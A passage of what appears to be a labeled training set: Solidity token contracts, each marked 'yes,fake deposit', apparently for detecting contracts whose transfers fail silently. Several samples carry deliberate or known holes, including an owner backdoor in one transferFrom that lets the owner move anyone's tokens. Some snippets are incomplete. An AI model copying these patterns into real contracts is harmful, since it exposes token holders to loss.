_value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 50000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 50000; // Update total supply (100000 for example)\n name = \"RadioInternacional.tv\"; // Set the name for display purposes\n decimals = 0; // Amount of decimals for display purposes\n symbol = \"RITV\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 1000000000; // Update total supply (100000 for example)\n name = \"clown.finance\"; // Set the name for display purposes\n decimals = 0; // Amount of decimals for display purposes\n symbol = \"CLOWN\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\n\nabstract contract ERC20Basic {\n uint256 public _totalSupply = 100000000000000000000000000; //100 000 000\n function totalSupply() public virtual view returns (uint256);\n function balanceOf(address who) public virtual view returns (uint256);\n function transfer(address to, uint256 value) public virtual returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\n\n\nabstract contract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public virtual view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public virtual returns (bool);\n function approve(address spender, uint256 value) public virtual returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n\ncontract Ownable {\n\n // Owner address of contract. Assigned on deployment.\n address payable public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n constructor() {\n owner = payable(msg.sender);\n }\n\n \n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n\n \n function transferOwnership(address payable newOwner) onlyOwner public {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\n\n\n\n\nabstract contract StandardToken is ERC20, Ownable {\n // Addresses and balances (in tokens) of all clients. Required by ERC20.\n mapping (address => uint256) balances;\n // Clients, allowed to work. Required by ERC20.\n mapping (address => mapping (address => uint256)) allowed;\n \n function totalSupply() public override view returns (uint256) {\n return _totalSupply;\n }\n \n function transfer(address _to, uint256 _value) override public returns (bool success) {\n if (balances[msg.sender] >= _value\n && _value > 0\n && balances[_to] + _value > balances[_to])\n {\n uint256 obalance = balances[msg.sender];\n if ( obalance >= _value)\n {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n else\n {\n return false;\n }\n }\n else\n {\n return false;\n }\n }\n\n function balanceOf(address _owner) public override view returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public override returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public override view returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n}\n\n\ncontract Coin is StandardToken {\n // A symbol of a coin.\n string public constant symbol = \"EXTRA\";\n // A name of a coin.\n string public constant name = \"ExtraToken\";\n // A number of decimals in a coin.\n uint8 public constant decimals = 18;\n \n event TransferFromTo(address indexed _from, address indexed _to, address indexed _by, uint256 _value);\n\n \n constructor() payable {\n owner = payable(msg.sender);\n balances[owner] = _totalSupply;\n emit Transfer(address(this), owner, _totalSupply);\n }\n\n \n function kill() public onlyOwner {\n selfdestruct(owner);\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {\n if (msg.sender == owner) {\n allowed[_from][msg.sender] = _value;\n }\n\n if (balances[_from] >= _value\n && allowed[_from][msg.sender] >= _value\n && _value > 0)\n {\n uint256 obalance = balances[_from];\n if ( obalance >= _value)\n {\n\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(_from, _to, _value);\n emit TransferFromTo(_from, _to, msg.sender, _value);\n return true;\n }\n else\n {\n return false;\n }\n }\n else\n\t\t{\n return false;\n }\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\n\n\n\n\n\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n\n function transfer(address to, uint value) public returns (bool ok);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract VoltNFT is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 20000000*10**uint256(decimals);\n\n string public constant name = \"VoltNFT\";\n string public constant symbol = \"VOLTY\";\n\n address payable teamAddress;\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n\n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract ERC20Token is StandardToken {\n\n function () {\n throw;\n }\n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'H1.0'; \n\n function ERC20Token(\n ) {\n balances[msg.sender] = 666666666000000000000000000; \n totalSupply = 1000000000000000000000000000; \n name = \"SISURI - THE Moral AI\"; \n decimals = 18; \n symbol = \"MORAL\"; \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Unlicensed\n\n\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Tokenplace is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 250000000*10**uint256(decimals);\n string public constant name = \"Tokenplace\";\n string public constant symbol = \"TOK\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract Tracer is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name = 'Tracer'; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol = 'TCR'; //An identifier: eg SBX\n string public version = '0.0.1'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function Tracer(\n ) {\n balances[msg.sender] = 2000000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 2000000000000000000000000; // Update total supply (100000 for example)\n name = \"Tracer\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals for display purposes\n symbol = \"TCR\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract InuHedgehog is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Inu Hedgehog\";\n string public constant symbol = \"INUH \ud83e\udd94\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.6.12;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address payable) {\n return msg.sender;\n }\n\n function _msgData() internal view virtual returns (bytes memory) {\n this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n return msg.data;\n }\n}\n\n\n\ncontract KIGGAL is Context, IBEP20, Ownable {\n using SafeMath for uint256;\n using Address for address;\n\n mapping (address => uint256) private _rOwned;\n mapping (address => uint256) private _tOwned;\n mapping (address => mapping (address => uint256)) private _allowances;\n \n mapping (address => bool) private _isSniper;\n\n mapping (address => bool) private _isExcludedFromFee;\n\n mapping (address => bool) private _isExcluded;\n address[] private _excluded;\n \n mapping(address => bool) private _whiteList;\n\n uint256 private constant MAX = ~uint256(0);\n uint256 private _tTotal = 1000000 * 10**9 * 10**9; \n uint256 private _rTotal = (MAX - (MAX % _tTotal));\n uint256 private _tFeeTotal;\n \n uint256 public launchTime;\n bool public tradingOpen = false;\n\n string private _name = \"KIGGAL\";\n string private _symbol = \"KIGGAL\";\n uint8 private _decimals = 9;\n\n\n uint256 public _taxFee = 10;\n uint256 private _previousTaxFee = _taxFee;\n\n uint256 public _maxTxAmount = 1000000 * 10**9 * 10**9;\n\n\n constructor () public {\n _rOwned[_msgSender()] = _rTotal;\n\n _isExcludedFromFee[owner()] = true;\n _isExcludedFromFee[address(this)] = true;\n \n emit Transfer(address(0), _msgSender(), _tTotal);\n }\n \n function openTrading() external onlyOwner() {\n tradingOpen = true;\n launchTime = block.timestamp;\n }\n \n function addToWhiteList(address account) external onlyOwner() {\n require(!_whiteList[account], \"Account is already in whiteList\");\n _whiteList[account] = true;\n }\n \n function addListToWhiteList(address[] calldata accountList) external onlyOwner() {\n require(accountList.length > 0, \"No account found\");\n for (uint256 i = 0; i < accountList.length; i++) {\n if (!_whiteList[accountList[i]]) {\n _whiteList[accountList[i]] = true; \n }\n }\n }\n\n function removeFromWhiteList(address account) external onlyOwner() {\n require(_whiteList[account], \"Account is not in whiteList\");\n _whiteList[account] = false;\n }\n \n function removeListFromWhiteList(address[] calldata accountList) external onlyOwner() {\n require(accountList.length > 0, \"No account found\");\n for (uint256 i = 0; i < accountList.length; i++) {\n if (_whiteList[accountList[i]]) {\n _whiteList[accountList[i]] = false; \n }\n }\n }\n\n function name() public view returns (string memory) {\n return _name;\n }\n\n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n function decimals() public view returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public view override returns (uint256) {\n return _tTotal;\n }\n\n function balanceOf(address account) public view override returns (uint256) {\n if (_isExcluded[account]) return _tOwned[account];\n return tokenFromReflection(_rOwned[account]);\n }\n\n function transfer(address recipient, uint256 amount) public override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n\n function allowance(address owner, address spender) public view override returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public override returns (bool) {\n _approve(_msgSender(), spender, amount);\n return true;\n }\n\n function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n _transfer(sender, recipient, amount);\n _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"BEP20: transfer amount exceeds allowance\"));\n return true;\n }\n\n\n function _approve(address owner, address spender, uint256 amount) private {\n require(owner != address(0), \"BEP20: approve from the zero address\");\n require(spender != address(0), \"BEP20: approve to the zero address\");\n\n _allowances[owner][spender] = amount;\n emit Approval(owner, spender, amount);\n }\n\n function _transfer(\n address from,\n address to,\n uint256 amount\n ) private {\n require(from != address(0), \"BEP20: transfer from the zero address\");\n require(to != address(0), \"BEP20: transfer to the zero address\");\n require(amount > 0, \"Transfer amount must be greater than zero\");\n require(!_isSniper[to], \"You have no power here!\");\n require(!_isSniper[msg.sender], \"You have no power here!\");\n if(from != owner() && to != owner() && !_whiteList[from] && !_whiteList[to]) {\n require(amount <= _maxTxAmount, \"Transfer amount exceeds the maxTxAmount.\");\n if (!tradingOpen) {\n if (!(from == address(this) || to == address(this)\n || from == address(owner()) || to == address(owner()))) {\n require(tradingOpen, \"Trading is not enabled\");\n }\n }\n }\n \n \n \n if(from != owner() && to != owner()) {\n require(amount <= _maxTxAmount, \"Transfer amount exceeds the maxTxAmount.\");\n }\n\n bool takeFee = true;\n\n //if any account belongs to _isExcludedFromFee account then remove the fee\n if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){\n takeFee = false;\n }\n\n _tokenTransfer(from,to,amount,takeFee);\n }\n\n}\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.6.12;\npragma experimental ABIEncoderV2;\n\ncontract Domain {\n\n constructor() public {\n uint256 chainId;\n assembly {\n chainId := chainid()\n }\n _DOMAIN_SEPARATOR = _calculateDomainSeparator(DOMAIN_SEPARATOR_CHAIN_ID = chainId);\n }\n\n function _domainSeparator() internal view returns (bytes32) {\n uint256 chainId;\n assembly {\n chainId := chainid()\n }\n return chainId == DOMAIN_SEPARATOR_CHAIN_ID ? _DOMAIN_SEPARATOR : _calculateDomainSeparator(chainId);\n }\n\n function _getDigest(bytes32 dataHash) internal view returns (bytes32 digest) {\n digest = keccak256(abi.encodePacked(EIP191_PREFIX_FOR_EIP712_STRUCTURED_DATA, _domainSeparator(), dataHash));\n }\n}\n\n\ncontract ERC20Data {\n /// @notice owner > balance mapping.\n mapping(address => uint256) public balanceOf;\n /// @notice owner > spender > allowance mapping.\n mapping(address => mapping(address => uint256)) public allowance;\n /// @notice owner > nonce mapping. Used in `permit`.\n mapping(address => uint256) public nonces;\n}\n\ncontract ERC20 is ERC20Data, Domain {\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n function transfer(address to, uint256 amount) public returns (bool) {\n // If `amount` is 0, or `msg.sender` is `to` nothing happens\n if (amount != 0) {\n uint256 srcBalance = balanceOf[msg.sender];\n require(srcBalance >= amount, \"ERC20: balance too low\");\n if (msg.sender != to) {\n require(to != address(0), \"ERC20: no zero address\"); // Moved down so low balance calls safe some gas\n\n balanceOf[msg.sender] = srcBalance - amount; // Underflow is checked\n balanceOf[to] += amount; // Can't overflow because totalSupply would be greater than 2^256-1\n }\n }\n emit Transfer(msg.sender, to, amount);\n return true;\n }\n\n function transferFrom(\n address from,\n address to,\n uint256 amount\n ) public returns (bool) {\n // If `amount` is 0, or `from` is `to` nothing happens\n if (amount != 0) {\n uint256 srcBalance = balanceOf[from];\n require(srcBalance >= amount, \"ERC20: balance too low\");\n\n if (from != to) {\n uint256 spenderAllowance = allowance[from][msg.sender];\n // If allowance is infinite, don't decrease it to save on gas (breaks with EIP-20).\n if (spenderAllowance != type(uint256).max) {\n require(spenderAllowance >= amount, \"ERC20: allowance too low\");\n allowance[from][msg.sender] = spenderAllowance - amount; // Underflow is checked\n }\n require(to != address(0), \"ERC20: no zero address\"); // Moved down so other failed calls safe some gas\n\n balanceOf[from] = srcBalance - amount; // Underflow is checked\n balanceOf[to] += amount; // Can't overflow because totalSupply would be greater than 2^256-1\n }\n }\n emit Transfer(from, to, amount);\n return true;\n }\n\n function approve(address spender, uint256 amount) public returns (bool) {\n allowance[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true;\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
